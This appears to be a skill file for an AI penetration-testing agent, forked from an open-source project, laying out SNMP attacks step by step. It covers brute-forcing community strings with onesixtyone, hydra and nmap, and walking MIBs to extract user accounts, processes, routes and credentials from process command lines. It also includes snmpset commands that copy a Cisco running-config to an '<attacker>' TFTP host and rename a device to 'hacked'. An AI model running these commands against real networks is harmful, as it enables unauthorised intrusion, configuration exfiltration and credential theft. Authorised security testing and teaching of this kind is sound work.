<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: snmp
description: SNMP security testing — community string enumeration, MIB walking, SNMP v1/v2c/v3 brute force, information disclosure, and device configuration extraction
---

# SNMP Security Testing

SNMP (Simple Network Management Protocol) — device management protocol. Default community strings `public`/`private` grant full read/write access. Exposes: system info, routing tables, running processes, interface IPs, installed software.

**Install:**
```
sudo apt-get install -y snmp snmp-mibs-downloader snmpwalk onesixtyone snmpenum
pip install snmp-check --break-system-packages
# snmp-check: sudo apt-get install -y snmp-check
```

**Ports:** 161/UDP (agent), 162/UDP (trap)

---

## Reconnaissance

    nmap -p 161 <target> -sU --open -sV
    nmap -p 161 <target> -sU --script snmp-info,snmp-brute,snmp-sysdescr

---

## Community String Brute Force

    # onesixtyone — fast community string brute:
    onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <target>
    onesixtyone -i targets.txt -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt

    # Common community strings to try:
    # public, private, community, manager, admin, cisco, secret, internal, network

    # nmap:
    nmap -p 161 -sU --script snmp-brute <target>
    nmap -p 161 -sU --script snmp-brute --script-args snmp-brute.communitiesdb=/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <target>

    # hydra:
    hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt -v <target> snmp

---

## MIB Walking (Data Extraction)

Once community string found, walk the entire MIB tree:

    # Full MIB walk:
    snmpwalk -v 2c -c public <target>                    # Version 2c
    snmpwalk -v 1 -c public <target>                     # Version 1
    snmpwalk -v 2c -c public <target> > output/snmp_full.txt

    # Setup MIBs for human-readable output:
    sudo apt-get install -y snmp-mibs-downloader
    sudo download-mibs
    # Edit /etc/snmp/snmp.conf: comment out "mibs :" line

    # Specific OID queries:
    snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.1       # System info
    snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.25.4.2  # Running processes
    snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.25.6.3  # Installed software
    snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.4.20    # IP addresses
    snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.4.21    # Routing table
    snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.6.13    # Open TCP ports
    snmpwalk -v 2c -c public <target> 1.3.6.1.4.1.77.1.2.25  # Windows users

    # snmpget — specific value:
    snmpget -v 2c -c public <target> sysDescr.0            # System description
    snmpget -v 2c -c public <target> sysName.0             # Hostname

---

## snmp-check — Automated Comprehensive Enumeration

    snmp-check <target>                              # Default (public, v2c)
    snmp-check -c private <target>                   # With private community
    snmp-check -v 1 -c public <target>               # Force version 1

    # Output includes:
    # System info, Hostname, Contact, Location
    # Network interfaces and IPs
    # Routing table
    # Running processes
    # TCP/UDP open ports
    # Installed software (Windows)
    # User accounts (Windows)
    # Storage info

---

## High-Value SNMP Data

    # Windows user accounts (OID .1.3.6.1.4.1.77.1.2.25):
    snmpwalk -v 2c -c public <target> .1.3.6.1.4.1.77.1.2.25

    # Running processes (extract usernames from process list):
    snmpwalk -v 2c -c public <target> .1.3.6.1.2.1.25.4.2.1.2

    # Network interfaces + IPs:
    snmpwalk -v 2c -c public <target> .1.3.6.1.2.1.4.20.1

    # TCP connections (shows what services connect to what):
    snmpwalk -v 2c -c public <target> .1.3.6.1.2.1.6.13.1.3

    # Cisco device — config via SNMP (if write access):
    snmpset -v 2c -c private <target> .1.3.6.1.4.1.9.2.1.55.0 s "tftp://<attacker>/config"

---

## SNMP Write Access (Community = private)

    # Change system name:
    snmpset -v 2c -c private <target> sysName.0 s "hacked"

    # Cisco: copy running-config via TFTP:
    snmpset -v 2c -c private <target> .1.3.6.1.4.1.9.2.1.55.0 s "tftp://<attacker>/running-config"

---

## SNMP v3 Enumeration

SNMPv3 uses authentication + encryption — more secure but still testable:

    # Enumerate v3 users:
    nmap -p 161 -sU --script snmp-brute --script-args snmp-brute.v3authlist=users.txt <target>

    # braa — fast v3:
    braa public@<target>:.1.3.6.1.2.1.1.1.0

---

## Pro Tips

1. "public" and "private" work on >60% of SNMP-enabled devices — try these first
2. SNMP reveals running processes, open ports, and user accounts without any auth on v1/v2c
3. Cisco/network device SNMP often reveals VPN credentials in process cmdline
4. Windows SNMP + "public" → `.1.3.6.1.4.1.77.1.2.25` lists local user accounts
5. Write access with "private" on network gear → extract full device config via TFTP
6. UDP scan is required (`-sU`) — TCP SNMP is rare; many scanners miss it

## Summary

SNMP testing: `nmap -sU -p 161` → `onesixtyone` community brute force → `snmp-check <target>` for full enumeration → `snmpwalk -v 2c -c public` for specific OID mining. Focus on: running processes (credentials in cmdline), user accounts (Windows SNMP), network interfaces, and installed software version fingerprinting.
